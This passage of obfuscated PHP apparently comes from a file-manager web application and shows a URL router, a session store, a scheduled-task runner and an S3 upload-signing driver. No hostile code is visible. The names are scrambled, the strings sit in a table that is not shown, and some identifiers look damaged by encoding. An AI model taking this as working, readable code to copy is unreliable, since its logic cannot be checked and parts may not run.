$Bİõ–«†‡[0] : $fÙùËÇºæÖ[8] . $Bİõ–«†‡[0]; $FÛ¥íŒ…ö› = $Bİõ–«†‡[1]; } array_push(self::$maps, $dù¯˜°íÁ); array_push(self::$routes, $bÖÈÑÄ£¾ƒ); array_push(self::$methods, strtoupper($D«øç¸‹–)); array_push(self::$callbacks, $FÛ¥íŒ…ö›); } public static function error($b¨İ¹„Ö¥) { self::$errorCallback = $b¨İ¹„Ö¥; } public static function haltOnMatch($b¢êŸ˜¯·£ = true) { self::$halts = $b¢êŸ˜¯·£; } public static function dispatch() { goto B²…¯½ê; B„ñ²„‰µ‰: $EŠì§ğÊ¶ø = array_keys(static::$patterns); $f¸×­ÅÂ™ = array_values(static::$patterns); $BÊ¼ŠÌÇŠ = !1; goto e¶ìÆ¦ï÷‰; e¶ìÆ¦ï÷‰: self::$routes = preg_replace($BØºåË–à[1047], $BØºåË–à[8], self::$routes); if (in_array($Fô°…İà, self::$routes)) { $fœÚ—’Ÿ = array_keys(self::$routes, $Fô°…İà); foreach ($fœÚ—’Ÿ as $C›Û¨•Ïßø) { if (self::$methods[$C›Û¨•Ïßø] == $FâÄÓƒĞêõ || self::$methods[$C›Û¨•Ïßø] == $BØºåË–à[1305] || in_array($FâÄÓƒĞêõ, self::$maps[$C›Û¨•Ïßø])) { $BÊ¼ŠÌÇŠ = !0; if (!is_object(self::$callbacks[$C›Û¨•Ïßø])) { $EÂ‡¯Š¢¦² = explode($BØºåË–à[8], self::$callbacks[$C›Û¨•Ïßø]); $B«¡õÀ«İî = end($EÂ‡¯Š¢¦²); $dõÛï›‚¤æ = explode($BØºåË–à[1306], $B«¡õÀ«İî); $e·ˆ†àÇÕÇ = new $dõÛï›‚¤æ[0](); $e·ˆ†àÇÕÇ->{$dõÛï›‚¤æ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$C›Û¨•Ïßø]); if (self::$halts) { return; } } } } } else { $eèŸ„™´¬ê = 0; foreach (self::$routes as $C›Û¨•Ïßø) { if (strpos($C›Û¨•Ïßø, $BØºåË–à[4]) !== !1) { $C›Û¨•Ïßø = str_replace($EŠì§ğÊ¶ø, $f¸×­ÅÂ™, $C›Û¨•Ïßø); } if (preg_match($BØºåË–à[1307] . $C›Û¨•Ïßø . $BØºåË–à[1308], $Fô°…İà, $eÖÍƒ½…‰)) { if (self::$methods[$eèŸ„™´¬ê] == $FâÄÓƒĞêõ || self::$methods[$eèŸ„™´¬ê] == $BØºåË–à[1305] || !empty(self::$maps[$eèŸ„™´¬ê]) && in_array($FâÄÓƒĞêõ, self::$maps[$eèŸ„™´¬ê])) { $BÊ¼ŠÌÇŠ = !0; array_shift($eÖÍƒ½…‰); if (!is_object(self::$callbacks[$eèŸ„™´¬ê])) { $EÂ‡¯Š¢¦² = explode($BØºåË–à[8], self::$callbacks[$eèŸ„™´¬ê]); $B«¡õÀ«İî = end($EÂ‡¯Š¢¦²); $dõÛï›‚¤æ = explode($BØºåË–à[1306], $B«¡õÀ«İî); $e·ˆ†àÇÕÇ = new $dõÛï›‚¤æ[0](); if (!method_exists($e·ˆ†àÇÕÇ, $dõÛï›‚¤æ[1])) { echo $BØºåË–à[1309]; } else { call_user_func_array(array($e·ˆ†àÇÕÇ, $dõÛï›‚¤æ[1]), $eÖÍƒ½…‰); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$eèŸ„™´¬ê], $eÖÍƒ½…‰); if (self::$halts) { return; } } } } $eèŸ„™´¬ê++; } } if ($BÊ¼ŠÌÇŠ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $DÅ—»‘Ù¥ò =& $_SERVER[ì‹É]; header($_SERVER[$DÅ—»‘Ù¥ò[1310]] . $DÅ—»‘Ù¥ò[1311]); echo $DÅ—»‘Ù¥ò[1312]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$BØºåË–à[1304]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto dÁæ°õ³; B²…¯½ê: $BØºåË–à =& $_SERVER[ì‹É]; $Fô°…İà = parse_url($_SERVER[$BØºåË–à[1304]], PHP_URL_PATH); $FâÄÓƒĞêõ = $_SERVER[$BØºåË–à[151]]; goto B„ñ²„‰µ‰; dÁæ°õ³: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto aÀÚŒÙ˜îœ; A¿÷¬ÑÒ¾ñ: $f­¿Ó¡°‰‹ = $GLOBALS[$f»¡Ñ¡êçÛ[6]][$f»¡Ñ¡êçÛ[334]]; self::$sessionTime = $f­¿Ó¡°‰‹[$f»¡Ñ¡êçÛ[1313]]; if (self::$sessionSign) { } else { if (Cookie::get(SESSION_ID)) { self::$sessionSign = Cookie::get(SESSION_ID); } else { self::$sessionSign = guid(); } } goto EŠ†Å–¦“›; EŠ†Å–¦“›: Cookie::setSafe(SESSION_ID, self::$sessionSign, self::$sessionTime); $F“ÚŸ†ª±‹ = $f­¿Ó¡°‰‹[$f»¡Ñ¡êçÛ[1314]]; $D˜Ê½ˆ°Ä‹ = $f­¿Ó¡°‰‹[$F“ÚŸ†ª±‹]; goto EÒ‚¥Íäºó; aÀÚŒÙ˜îœ: $f»¡Ñ¡êçÛ =& $_SERVER[ì‹É]; static $eŠñ¥ğ¢Í¿ = false; if ($eŠñ¥ğ¢Í¿) { return $eŠñ¥ğ¢Í¿; } goto A¿÷¬ÑÒ¾ñ; dÑÔªêÀñ: $eŠñ¥ğ¢Í¿ = new self(); return $eŠñ¥ğ¢Í¿; goto cĞ—¨ö–¤; EÒ‚¥Íäºó: $dĞĞŠŞêƒ† = $f­¿Ó¡°‰‹[$f»¡Ñ¡êçÛ[759]]; switch ($F“ÚŸ†ª±‹) { case $f»¡Ñ¡êçÛ[17]: self::$handle = Model($f»¡Ñ¡êçÛ[760]); break; case $f»¡Ñ¡êçÛ[761]: self::$handle = new CacheRedis($D˜Ê½ˆ°Ä‹, $dĞĞŠŞêƒ†); break; case $f»¡Ñ¡êçÛ[762]: self::$handle = new CacheMemcached($D˜Ê½ˆ°Ä‹, $dĞĞŠŞêƒ†); break; case $f»¡Ñ¡êçÛ[164]: $D˜Ê½ˆ°Ä‹[$f»¡Ñ¡êçÛ[76]] = $D˜Ê½ˆ°Ä‹[$f»¡Ñ¡êçÛ[76]] . $f»¡Ñ¡êçÛ[1315]; self::$handle = new CacheFile($D˜Ê½ˆ°Ä‹, $dĞĞŠŞêƒ†); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } goto dÑÔªêÀñ; cĞ—¨ö–¤: } public static function sign($bÅ”¤„§Šï = false) { $bÅ”¤„§Šï && (self::$sessionSign = $bÅ”¤„§Šï); self::init(); return self::$sessionSign; } public static function set($Eƒ·´ôÌ¤, $d½â¸»±»õ = false) { self::init(); if (is_array($Eƒ·´ôÌ¤)) { foreach ($Eƒ·´ôÌ¤ as $F¹¢›ºò¶ => $AÂ»ã£ì®) { array_set_value(self::$data, $F¹¢›ºò¶, $AÂ»ã£ì®); } } else { array_set_value(self::$data, $Eƒ·´ôÌ¤, $d½â¸»±»õ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($AÒ¢¶Íˆñğ = false) { self::init(); if (!$AÒ¢¶Íˆñğ) { return self::$data; } return array_get_value(self::$data, $AÒ¢¶Íˆñğ); } public static function remove($Fœ˜¤–¡£Å) { self::init(); unset(self::$data[$Fœ˜¤–¡£Å]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ì‹É][764])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto eÉ¡¢ÅîÏ; DÏÕà“ï•å: while (!0) { self::cacheClear(); if (self::valueGet($A…°æù°±Ò[676]) != $A…°æù°±Ò[84]) { self::valueSet($A…°æù°±Ò[1316], $A…°æù°±Ò[464]); self::log($A…°æù°±Ò[1320]); die; } self::valueSet($A…°æù°±Ò[1316], $A…°æù°±Ò[84]); self::valueSet($A…°æù°±Ò[1317], time()); self::taskRunAll(); sleep(self::valueGet($A…°æù°±Ò[1321])); } goto DÕÔë†ÕŸ™; eÉ¡¢ÅîÏ: $A…°æù°±Ò =& $_SERVER[ì‹É]; if (self::valueGet($A…°æù°±Ò[676]) != $A…°æù°±Ò[84]) { return; } if (self::valueGet($A…°æù°±Ò[1316]) == $A…°æù°±Ò[84]) { $d…ÅÕ–ÉïØ = self::valueGet($A…°æù°±Ò[1317]); if (time() - $d…ÅÕ–ÉïØ > 3600 * 2) { self::restart(); } return; } goto aÃ¤ç…Í¥Ò; aÃ¤ç…Í¥Ò: http_close(); self::valueSet($A…°æù°±Ò[1316], $A…°æù°±Ò[84]); Hook::bind($A…°æù°±Ò[1318], $A…°æù°±Ò[1319]); goto DÏÕà“ï•å; DÕÔë†ÕŸ™: } public static function restart() { $FŸäéĞä =& $_SERVER[ì‹É]; http_close(); self::valueSet($FŸäéĞä[676], $FŸäéĞä[464]); sleep(self::valueGet($FŸäéĞä[1321]) + 5); self::valueSet($FŸäéĞä[1316], $FŸäéĞä[464]); self::valueSet($FŸäéĞä[676], $FŸäéĞä[84]); } public static function shutdownEvent() { $càÈˆŒ÷à =& $_SERVER[ì‹É]; self::valueSet($càÈˆŒ÷à[1316], $càÈˆŒ÷à[464]); self::log($càÈˆŒ÷à[1322]); } public static function config($d“¯Ïó°ò¦, $Eî‡¬ƒ„Àğ) { $CÔ‡¦à‡Ú =& $_SERVER[ì‹É]; $e¹ÓÕ©º¨À = 20; $Eî‡¬ƒ„Àğ = intval($Eî‡¬ƒ„Àğ) <= $e¹ÓÕ©º¨À ? $e¹ÓÕ©º¨À : intval($Eî‡¬ƒ„Àğ); self::valueSet($CÔ‡¦à‡Ú[676], $d“¯Ïó°ò¦); self::valueSet($CÔ‡¦à‡Ú[1321], $Eî‡¬ƒ„Àğ); } private static function taskRunAll() { $DÊ´´í´ø‰ =& $_SERVER[ì‹É]; $eİÒÖˆä‘‘ = Model($DÊ´´í´ø‰[1323])->listData(); $bÆä—ğÒÛÒ = count($eİÒÖˆä‘‘); for ($BÕÄäâ˜áê = 0; $BÕÄäâ˜áê < $bÆä—ğÒÛÒ; $BÕÄäâ˜áê++) { $fÑÎÅñ† = $eİÒÖˆä‘‘[$BÕÄäâ˜áê]; if ($fÑÎÅñ†[$DÊ´´í´ø‰[1324]] != $DÊ´´í´ø‰[84]) { continue; } if (!self::taskTimeCheck($fÑÎÅñ†)) { continue; } self::taskRun($fÑÎÅñ†); } } private static function taskTimeCheck($Eãˆ­°†ï«) { goto b¸›ïá³ÕÏ; aÁ–ˆ÷ƒ: $d„‹¥Ÿò’ = strtotime($DÃÑ£ŒÉ³ê[1325] . $CŒ‰¼”®âä[$DÃÑ£ŒÉ³ê[1326]] . $DÃÑ£ŒÉ³ê[1327]) - strtotime($DÃÑ£ŒÉ³ê[1328]); $BÀ¢àÌĞß = time() - strtotime(date($DÃÑ£ŒÉ³ê[1329]) . $DÃÑ£ŒÉ³ê[1330]); $eã±à‰ªÃò = $BÀ¢àÌĞß >= $d„‹¥Ÿò’ && $BÀ¢àÌĞß <= $d„‹¥Ÿò’ + 3600; goto C÷ø¬‡Ü·; b¸›ïá³ÕÏ: $DÃÑ£ŒÉ³ê =& $_SERVER[ì‹É]; $CŒ‰¼”®âä = json_decode($Eãˆ­°†ï«[$DÃÑ£ŒÉ³ê[187]], !0); $dëôËÈÑùå = intval($Eãˆ­°†ï«[$DÃÑ£ŒÉ³ê[1317]]); goto aÁ–ˆ÷ƒ; C÷ø¬‡Ü·: switch ($CŒ‰¼”®âä[$DÃÑ£ŒÉ³ê[29]]) { case $DÃÑ£ŒÉ³ê[1331]: if (time() - $dëôËÈÑùå < 3600 * 24 * 30) { return !1; } if ($CŒ‰¼”®âä[$DÃÑ£ŒÉ³ê[1331]] == date($DÃÑ£ŒÉ³ê[1332]) && $eã±à‰ªÃò) { return !0; } break; case $DÃÑ£ŒÉ³ê[1333]: if (time() - $dëôËÈÑùå < 3600 * 24 * 7) { return !1; } $D¿ÔÔïõ‰Æ = date($DÃÑ£ŒÉ³ê[1334]) == 0 ? 7 : date($DÃÑ£ŒÉ³ê[1334]); if ($CŒ‰¼”®âä[$DÃÑ£ŒÉ³ê[1333]] == $D¿ÔÔïõ‰Æ && $eã±à‰ªÃò) { return !0; } break; case $DÃÑ£ŒÉ³ê[1326]: if (time() - $dëôËÈÑùå < 3600 * 24) { return !1; } if ($eã±à‰ªÃò) { return !0; } break; case $DÃÑ£ŒÉ³ê[1335]: if (time() - $dëôËÈÑùå >= floatval($CŒ‰¼”®âä[$DÃÑ£ŒÉ³ê[1335]]) * 60) { return !0; } break; default: break; } return !1; goto bŠÖ‡Æ¡ø; bŠÖ‡Æ¡ø: } public static function taskRun($E—›áàì²) { goto a˜·–Šô; a˜·–Šô: $eîŠ‚´Ëš =& $_SERVER[ì‹É]; self::log($eîŠ‚´Ëš[1336] . $E—›áàì²[$eîŠ‚´Ëš[364]] . $eîŠ‚´Ëš[1337] . $E—›áàì²[$eîŠ‚´Ëš[28]] . $eîŠ‚´Ëš[1338] . $E—›áàì²[$eîŠ‚´Ëš[1339]]); Model($eîŠ‚´Ëš[1323])->run($E—›áàì²[$eîŠ‚´Ëš[364]]); goto fŠ©“‘©£½; fŠ©“‘©£½: $aÔ‘·¤Š« = timeFloat(); $A¯‡Ğ¯¦ÁÅ = $eîŠ‚´Ëš[33]; switch ($E—›áàì²[$eîŠ‚´Ëš[29]]) { case $eîŠ‚´Ëš[292]: $F›ÒãèÜ— = url_request($E—›áàì²[$eîŠ‚´Ëš[1339]], $eîŠ‚´Ëš[213], !1, !1, !1, !1, 5); $A¯‡Ğ¯¦ÁÅ = strlen($F›ÒãèÜ—); break; case $eîŠ‚´Ëš[212]: $A¯‡Ğ¯¦ÁÅ = Hook::apply($E—›áàì²[$eîŠ‚´Ëš[1339]]); default: break; } goto dÎ„š±èŞ²; dÎ„š±èŞ²: Model($eîŠ‚´Ëš[1340])->add(array($eîŠ‚´Ëš[1341] => $eîŠ‚´Ëš[33], $eîŠ‚´Ëš[1342] => $eîŠ‚´Ëš[464], $eîŠ‚´Ëš[29] => $eîŠ‚´Ëš[1343] . $E—›áàì²[$eîŠ‚´Ëš[364]], $eîŠ‚´Ëš[1344] => json_encode(array($eîŠ‚´Ëš[28] => $E—›áàì²[$eîŠ‚´Ëš[28]], $eîŠ‚´Ëš[1345] => timeFloat() - $aÔ‘·¤Š«, $eîŠ‚´Ëš[278] => $A¯‡Ğ¯¦ÁÅ)))); self::log($eîŠ‚´Ëš[1346] . $E—›áàì²[$eîŠ‚´Ëš[364]] . $eîŠ‚´Ëš[1347] . $A¯‡Ğ¯¦ÁÅ); return !0; goto f¨õ²‹‹í; f¨õ²‹‹í: } private static function valueGet($a¸ŒÉ£Ğí) { $cÄâÁÛŒŸ =& $_SERVER[ì‹É]; $AˆäŞ®»ç = $cÄâÁÛŒŸ[1348]; $DÑîÍ¥õàˆ = Model($cÄâÁÛŒŸ[1349])->get($a¸ŒÉ£Ğí, $AˆäŞ®»ç); if (is_null($DÑîÍ¥õàˆ)) { Model($cÄâÁÛŒŸ[1349])->set($cÄâÁÛŒŸ[1321], 10, $AˆäŞ®»ç); Model($cÄâÁÛŒŸ[1349])->set($cÄâÁÛŒŸ[676], $cÄâÁÛŒŸ[84], $AˆäŞ®»ç); Model($cÄâÁÛŒŸ[1349])->set($cÄâÁÛŒŸ[1316], $cÄâÁÛŒŸ[464], $AˆäŞ®»ç); $DÑîÍ¥õàˆ = Model($cÄâÁÛŒŸ[1349])->get($a¸ŒÉ£Ğí, $AˆäŞ®»ç); } return $DÑîÍ¥õàˆ; } private static function valueSet($A•ÆØ”Ì´ï, $A‚æĞÁÓØÔ) { $e¬Û†øœ =& $_SERVER[ì‹É]; return Model($e¬Û†øœ[1349])->set($A•ÆØ”Ì´ï, $A‚æĞÁÓØÔ, $e¬Û†øœ[1348]); } protected static function log($DÀ½»äøáç) { write_log($DÀ½»äøáç, $_SERVER[ì‹É][1350]); } private static function cacheClear() { $fÊˆ÷Òæ× =& $_SERVER[ì‹É]; $b­³Û÷„ë¨ = Model($fÊˆ÷Òæ×[1349])->cacheKey($fÊˆ÷Òæ×[1348]); Cache::clearMemory($b­³Û÷„ë¨); } } goto BÇŒïõˆå; f‹§ÌğĞ†: define($_SERVER[ì‹É][224], 2); define($_SERVER[ì‹É][225], 3); define($_SERVER[ì‹É][226], 1); goto a½É¦ø´¿Ã; AİçÈâø±ö: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($e¹®äßº) { parent::__construct($e¹®äßº); } public function uploadFormData($d¥‹¦¦êŞî, $fÊÉÇ¥³ƒä = 3600) { goto Fˆæ”¡’Õ´; F¯© Ç†¢±: $BëÒÀ«™¡ = array($this->accessKey, $dÏ¼ĞíŠ·, $this->region, $Aíø¾‚ç‰», $aƒí®¡¸ˆ†); $fæŒªÏ·´¼ = implode($c±õä´ñ¹ò[8], $BëÒÀ«™¡); $bªæÉœ¡ŞÁ = array($c±õä´ñ¹ò[1068] => gmdate($c±õä´ñ¹ò[1067], strtotime($c±õä´ñ¹ò[1101])), $c±õä´ñ¹ò[1069] => array(array($c±õä´ñ¹ò[1071] => $this->bucket), array($c±õä´ñ¹ò[1070] => $E’İ÷Áîæç), array($c±õä´ñ¹ò[1072], $c±õä´ñ¹ò[1073], $c±õä´ñ¹ò[33]), array($c±õä´ñ¹ò[1072], $c±õä´ñ¹ò[1102], $c±õä´ñ¹ò[33]), array($c±õä´ñ¹ò[1072], $c±õä´ñ¹ò[1103], $c±õä´ñ¹ò[33]), array($c±õä´ñ¹ò[1074] => $CöŠŠ¢ö¬), array($c±õä´ñ¹ò[1104] => $fæŒªÏ·´¼), array($c±õä´ñ¹ò[1105] => $f­ƒÓ†¸è), array($c±õä´ñ¹ò[1106] => $dï¦Ã¸Óİ), array($c±õä´ñ¹ò[1107] => $FŞÄ°‹›Ó))); goto AÑÔÜéèÔ³; F·”±’Ô: $D—İâ„ºÓó = hash_hmac($c±õä´ñ¹ò[1108], $Aíø¾‚ç‰», $CùéŠÈîİÅ, !0); $d‰¯¶Úßå÷ = hash_hmac($c±õä´ñ¹ò[1108], $aƒí®¡¸ˆ†, $D—İâ„ºÓó, !0); $f¶‰ƒ“êË£ = hash_hmac($c±õä´ñ¹ò[1108], $F¯îø¢° , $d‰¯¶Úßå÷); goto e‰ÜŒøå»â; eªô§¹í: $aƒí®¡¸ˆ† = $c±õä´ñ¹ò[1100]; $FŞÄ°‹›Ó = $fÊÉÇ¥³ƒä . $c±õä´ñ¹ò[33]; $CöŠŠ¢ö¬ = $c±õä´ñ¹ò[1066]; goto F¯© Ç†¢±; b˜œˆ“³ª : $Aíø¾‚ç‰» = $c±õä´ñ¹ò[59]; $dï¦Ã¸Óİ = gmdate($c±õä´ñ¹ò[1099]); $dÏ¼ĞíŠ· = gmdate($c±õä´ñ¹ò[677]); goto eªô§¹í; Fˆæ”¡’Õ´: $c±õä´ñ¹ò =& $_SERVER[ì‹É]; $E’İ÷Áîæç = $c±õä´ñ¹ò[182]; $f­ƒÓ†¸è = $c±õä´ñ¹ò[1098]; goto b˜œˆ“³ª ; e‰ÜŒøå»â: $DèŠ‹¥ “ = array($c±õä´ñ¹ò[196] => $c±õä´ñ¹ò[33], $c±õä´ñ¹ò[1110] => $c±õä´ñ¹ò[33], $c±õä´ñ¹ò[1070] => $E’İ÷Áîæç, $c±õä´ñ¹ò[1074] => $CöŠŠ¢ö¬, $c±õä´ñ¹ò[1078] => $F¯îø¢° , $c±õä´ñ¹ò[1111] => $fæŒªÏ·´¼, $c±õä´ñ¹ò[1112] => $f­ƒÓ†¸è, $c±õä´ñ¹ò[1113] => $dï¦Ã¸Óİ, $c±õä´ñ¹ò[1114] => $FŞÄ°‹›Ó, $c±õä´ñ¹ò[1115] => $f¶‰ƒ“êË£, $c±õä´ñ¹ò[166] => $this->getHost()); return $DèŠ‹¥ “; goto Eø²Ğ‹‡çõ; AÑÔÜéèÔ³: $F¯îø¢°  = base64_encode(json_encode($bªæÉœ¡ŞÁ)); $Eßóö›ŸìŒ = hash_hmac($c±õä´ñ¹ò[1108], $dÏ¼ĞíŠ·, $c±õä´ñ¹ò[1109] . $this->secret, !0); $CùéŠÈîİÅ = hash_hmac($c±õä´ñ¹ò[1108], $this->region, $Eßóö›ŸìŒ, !0); goto F·”±’Ô; Eø²Ğ‹‡çõ: } public function multiUploadFormData($bÙ¬®äõÊ¿, $d»’à”‡¢ = 3600) { $bŠ½Ñ­Î¿ =& $_SERVER[ì‹É]; $E‡µêÅ·” = gmdate($bŠ½Ñ­Î¿[1195]); $cŒõ·õ¡Ç× = array(); $a¸‹„Ç†İ² = $this->client->getUploadId($this->bucket, $bÙ¬®äõÊ¿, $cŒõ·õ¡Ç×); if (!$a¸‹„Ç†İ²) { return !1; } return array($bŠ½Ñ­Î¿[206] => $a¸‹„Ç†İ², $bŠ½Ñ­Î¿[166] => $this->getHost() . $bŠ½Ñ­Î¿[8] . $this->pathEncode($bÙ¬®äõÊ¿), $bŠ½Ñ­Î¿[207] => $E‡µêÅ·”, $bŠ½Ñ­Î¿[90] => $bÙ¬®äõÊ¿); } public function multiUploadAuthData($cÂÑÏï¬À, $fÏ…‘“ØÛê = array()) { goto a²­Š¢æ¬; A«Ó”ôùîÌ: if (isset($fÏ…‘“ØÛê[$B Å›Í©¹Í[1196]])) { $A‚è¿ÅÅ°»[$B Å›Í©¹Í[1197]] = $fÏ…‘“ØÛê[$B Å›Í©¹Í[1196]]; } $aÀÛùë´¯ = explode($B Å›Í©¹Í[168], $this->getHost()); $B¬ùÓò…Ğá = array($B Å›Í©¹Í[1198] => $aÀÛùë´¯[1], $B Å›Í©¹Í[1199] => $B Å›Í©¹Í[33], $B Å›Í©¹Í[196] => $B Å›Í©¹Í[117], $B Å›Í©¹Í[1110] => $fÏ…‘“ØÛê[$B Å›Í©¹Í[78]]); goto aŠç¡å·²­; EèÇß¾²Ï: unset($fÏ…‘“ØÛê[$B Å›Í©¹Í[90]]); if (isset($fÏ…‘“ØÛê[$B Å›Í©¹Í[208]])) { return $this->listUploadParts($dÁ¬…éÆã­, $fÏ…‘“ØÛê); } $A‚è¿ÅÅ°» = array(); goto A«Ó”ôùîÌ; BùÆºÂâ…¹: if (strpos($f‹‘®ÍÊ´, $B Å›Í©¹Í[210]) === 0) { if (isset($A‚è¿ÅÅ°»[$B Å›Í©¹Í[1197]])) { $dÜÉ³¤ôæ = $A‚è¿ÅÅ°»[$B Å›Í©¹Í[1197]]; } else { if (isset($aùÒº®Ñ[$B Å›Í©¹Í[1197]])) { $dÜÉ³¤ôæ = $aùÒº®Ñ[$B Å›Í©¹Í[1197]]; } else { $dÜÉ³¤ôæ = hash($B Å›Í©¹Í[1108], $B Å›Í©¹Í[33]); } } return array($B Å›Í©¹Í[217] => $aùÒº®Ñ[$B Å›Í©¹Í[217]], $B Å›Í©¹Í[1197] => $dÜÉ³¤ôæ, $B Å›Í©¹Í[207] => $aùÒº®Ñ[$B Å›Í©¹Í[1200]]); } return $aùÒº®Ñ[$B Å›Í©¹Í[217]]; goto E‘”àèùĞÕ; aŠç¡å·²­: $bŠ…ËÒÅÍõ = $B Å›Í©¹Í[211]; $c·èÂ£ç¦î = $B Å›Í©¹Í[8] . $this->pathEncode($dÁ¬…éÆã­) . $f‹‘®ÍÊ´; $aùÒº®Ñ = $this->client->__getSignatureV4($A‚è¿ÅÅ°», $B¬ùÓò…Ğá, $bŠ…ËÒÅÍõ, $c·èÂ£ç¦î); goto BùÆºÂâ…¹; a²­Š¢æ¬: $B Å›Í©¹Í =& $_SERVER[ì‹É]; $f‹‘®ÍÊ´ = isset($fÏ…‘“ØÛê[$B Å›Í©¹Í[157]]) ? $fÏ…‘“ØÛê[$B Å›Í©¹Í[157]] : $B Å›Í©¹Í[33]; $dÁ¬…éÆã­ = $fÏ…‘“ØÛê[$B Å›Í©¹Í[90]]; goto EèÇß¾²Ï; E‘”àèùĞÕ: } public function listUploadParts($A¯á§ˆ¥¯, $BÍšé²™õô = array()) { goto b…ËÁò÷è; b…ËÁò÷è: $bêìîÔšõ¯ =& $_SERVER[ì‹É]; $aÍ“Ê¼“Õ· = str_replace($bêìîÔšõ¯[218], $bêìîÔšõ¯[33], $BÍšé²™õô[$bêìîÔšõ¯[157]]); $bŒÆ›À¼· = $this->client->listParts($this->bucket, $A¯á§ˆ¥¯, $aÍ“Ê¼“Õ·); goto cóêœÒàµä; cóêœÒàµä: if (!$bŒÆ›À¼·) { return !1; } $CŒíß•ìâ = $bêìîÔšõ¯[1201]; foreach ($bŒÆ›À¼· as $dÉª¥Š×‹Ş) { $CŒíß•ìâ .= $bêìîÔšõ¯[1202] . "\74\120\x61\162\x74\x4e\x75\155\142\x65\162\x3e{$dÉª¥Š×‹Ş[$bêìîÔšõ¯[1153]]}\x3c\57\x50\141\x72\x74\x4e\x75\155\142\145\x72\x3e\xa" . "\x3c\105\x54\141\x67\76{$dÉª¥Š×‹Ş[$bêìîÔšõ¯[1154]]}\x3c\57\105\124\141\x67\x3e\12" . $bêìîÔšõ¯[1203]; } goto eŸÖÎËå; eŸÖÎËå: $CŒíß•ìâ .= $bêìîÔšõ¯[1204]; $a£˜ãˆŒÂ = array(); $c±¤‰óë®“ = explode($bêìîÔšõ¯[168], $this->getHost()); goto a×Û¨«…›ñ; a×Û¨«…›ñ: $AŸİ·Ú³í‘ = array($bêìîÔšõ¯[1198] => $c±¤‰óë®“[1], $bêìîÔšõ¯[196] => $bêìîÔšõ¯[117], $bêìîÔšõ¯[1110] => strlen($CŒíß•ìâ)); $d‚«ğªéˆ = $bêìîÔšõ¯[209]; $b¿ÕïŞÙë = $bêìîÔšõ¯[8] . $this->pathEncode($A¯á§ˆ¥¯) . $BÍšé²™õô[$bêìîÔšõ¯[157]]; goto EÃƒÃ‚ìÚ§; EÃƒÃ‚ìÚ§: $AÒ¸š›ñã = $this->client->__getSignatureV4($a£˜ãˆŒÂ, $AŸİ·Ú³í‘, $d‚«ğªéˆ, $b¿ÕïŞÙë, $CŒíß•ìâ); return array($bêìîÔšõ¯[217] => $AÒ¸š›ñã[$bêìîÔšõ¯[217]], $bêìîÔšõ¯[207] => $AÒ¸š›ñã[$bêìîÔšõ¯[1200]], $bêìîÔšõ¯[219] => $bŒÆ›À¼·, $bêìîÔšõ¯[1197] => $AÒ¸š›ñã[$bêìîÔšõ¯[1197]]); goto d°«»âè; d°«»âè: } public function link($D£Âò‹µ¡Û, $AñŒÊŸ¹ïò = array()) { return parent::link($D£Âò‹µ¡Û, $AñŒÊŸ¹ïò); } public function fileOut($A–ù¨•ğŒ¢, $a¼¿‘‡êª˜ = false, $A”İàñê´ = false, $f¦¹‘¿ÖõÆ = '') { if (strstr($this->endpoint, $_SERVER[ì‹É][1205])) { return parent::fileOutServer($A–ù¨•ğŒ¢, $a¼¿‘‡êª˜, $A”İàñê´, $f¦¹‘¿ÖõÆ); } parent::fileOut($A–ù¨•ğŒ¢, $a¼¿‘‡êª˜, $A”İàñê´, $f¦¹‘¿ÖõÆ); } public function fileOutImage($c•Ğëƒ“ø¬, $BÑ«’”×£‘ = 250) { if (strstr($this->endpoint, $_SERVER[ì‹É][1205])) { return parent::fileOutImageServer($c•Ğëƒ“ø¬, $BÑ«’”×£‘); } parent::fileOutImage($c•Ğëƒ“ø¬, $BÑ«’”×£‘); } public function fileOutLink($aïõ¥ÉéÑÄ) { $b’Æ’¡ãç =& $_SERVER[ì‹É]; if (substr($aïõ¥ÉéÑÄ, 0, 7) == $b’Æ’¡ãç[1081]) { $aïõ¥ÉéÑÄ = $b’Æ’¡ãç[1082] . substr($aïõ¥ÉéÑÄ, 7); } header($b’Æ’¡ãç[153] . $aïõ¥ÉéÑÄ); die; } public function getHost() { $f•–¿‡°ÄŠ =& $_SERVER[ì‹É]; $eÂÙÁÖ›×œ = str_rtrim(parent::getHost(), $f•–¿‡°ÄŠ[8] . $this->bucket); $eÂÙÁÖ›×œ = explode($f•–¿‡°ÄŠ[168], $eÂÙÁÖ›×œ); return $eÂÙÁÖ›×œ[0] . $f•–¿‡°ÄŠ[168] . $this->bucket . $f•–¿‡°ÄŠ[94] . $eÂÙÁÖ›×œ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($cøĞáæğÖ, $cÍˆ¦„ñÙ´ = 0) { parent::__construct(); $this->source = $cøĞáæğÖ; $this->sourceSize = $cÍˆ¦„ñÙ´; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($BĞËõçèí™ = false) { return $this->sourceSize; } public function getContent($E‘Œ×’ œ¦ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $FÊá³„ƒ†¯ = ftell($this->source); $b„¿¨»¾ÏŞ = @fread($this->source, $this->sourceSize); fseek($this->source, $FÊá³„ƒ†¯); return $b„¿¨»¾ÏŞ; } } public function fileSubstr($a„ğõ£ŒËî = false, $EšÕÛ‚Õâ = 0, $bŒƒÈõ‡´ç = 0) { if 